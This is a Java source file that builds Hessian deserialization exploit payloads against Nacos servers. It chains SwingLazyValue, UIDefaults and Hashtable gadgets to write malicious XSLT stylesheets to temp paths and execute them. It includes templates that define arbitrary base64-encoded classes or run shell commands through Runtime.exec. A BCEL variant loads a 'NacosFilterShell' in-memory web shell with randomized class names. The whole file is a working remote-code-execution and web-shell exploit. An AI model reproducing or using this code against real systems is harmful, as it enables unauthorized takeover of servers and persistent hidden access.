package com.alibaba.nacos.consistency.entity;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Random;

public class HessianPayload {
    public static String os = "linux";

    final static String xsltTemplate = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n" +
            "xmlns:b64=\"http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\"\n" +
            "xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"\n" +
            "xmlns:th=\"http://xml.apache.org/xalan/java/java.lang.Thread\"\n" +
            "xmlns:ru=\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\"\n" +
            ">\n" +
            "    <xsl:template match=\"/\">\n" +
            "      <xsl:variable name=\"bs\" select=\"b64:decodeBuffer(b64:new(),'<base64_payload>')\"/>\n" +
            "      <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>\n" +
            "      <xsl:variable name=\"rce\" select=\"ru:defineClass('<class_name>',$bs,$cl)\"/>\n" +
            "      <xsl:value-of select=\"$rce\"/>\n" +
            "    </xsl:template>\n" +
            "  </xsl:stylesheet>";

    final static String xsltTemplateJustRce = "<xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:java=\"http://saxon.sf.net/java-type\">\n" +
            "    <xsl:template match=\"/\">\n" +
            "    <xsl:value-of select=\"Runtime:exec(Runtime:getRuntime(),'<command>')\" xmlns:Runtime=\"java.lang.Runtime\"/>\n" +
            "    </xsl:template>\n" +
            "</xsl:stylesheet>";

    public static String genClassName() {
        Random random = new Random();
        int length = random.nextInt(10) + 1; // 随机生成字符串的长度，范围从1到10
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            char c = (char) (random.nextInt('z' - 'a') + 'a'); // 生成随机字符，范围从a到z
            sb.append(c);
        }
        return sb.toString();
    }

    public static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static Object genPayloadOfBcel() throws Exception {
        JavaClass clazz = Repository.lookupClass(NacosFilterShell.class);
        String payload = "$$BCEL$$" + Utility.encode(clazz.getBytes(), true);
        SwingLazyValue value = new
                SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper","_main",new Object[]
                {new String[]{payload}});

        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put(value, value);

        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put(value, value);

        return makeMap(uiDefaults, hashtable);
    }


    public static Object genPayloadOfXslt(String payloadType) throws Exception {
        String tmpPath = "";
        if("linux".equalsIgnoreCase(os)){
            tmpPath = "/tmp/nacos_data_temp";
        }else if("windows".equalsIgnoreCase(os)){
            tmpPath = "C:\\Windows\\Temp\\nacos_data_temp";
        }
        SwingLazyValue value = null;
        if (payloadType.equals("memshell")) {
            //获取MemShell
            ClassPool cp = ClassPool.getDefault();
            cp.insertClassPath(new ClassClassPath(NacosFilterShell.class)); // 替换内存马
            CtClass cc = cp.get(NacosFilterShell.class.getName());
            cc.setName(genClassName());
            byte[] bs = cc.toBytecode();

            String base64Code = new sun.misc.BASE64Encoder().encode(bs).replaceAll("\n", "");
            String xslt = xsltTemplate.replace("<base64_payload>", base64Code).replace("<class_name>", cc.getName());
            value = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{tmpPath, xslt.getBytes()});
        } else if (payloadType.equals("run")) {
            value = new SwingLazyValue("com.sun.org.apache.xalan.internal.xslt.Process", "_main", new Object[]{new String[]{"-XT", "-XSL", "file://"+tmpPath}});
        }else if (payloadType.startsWith("cmd:")){
            String cmd = payloadType.substring(4);
            String xslt = xsltTemplateJustRce.replace("<command>",cmd);
            value = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{tmpPath, xslt.getBytes()});
        }

        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put(value, value);

        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put(value, value);

        return makeMap(uiDefaults, hashtable);
    }
}

